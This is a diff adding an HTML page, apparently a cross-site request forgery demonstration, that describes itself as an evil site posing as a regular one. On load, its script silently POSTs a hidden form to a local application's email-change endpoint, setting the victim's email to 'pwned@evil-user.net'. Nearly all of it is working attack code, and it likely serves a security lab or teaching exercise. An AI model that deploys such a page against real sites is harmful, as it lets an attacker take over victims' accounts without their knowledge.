@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+
+<body>
+Hello. I look like regular site, but I'm evil
+
+<form id="myform" action="http://localhost:8080/email/change" method="POST">
+    <input type="hidden" name="email" value="pwned@evil-user.net"/>
+</form>
+<script>
+    var form = document.getElementById("myform");
+    var data = new FormData(form);
+    fetch("http://localhost:8080/change-email", {method: "POST", body: data});
+</script>
+</body>
+
+</html>
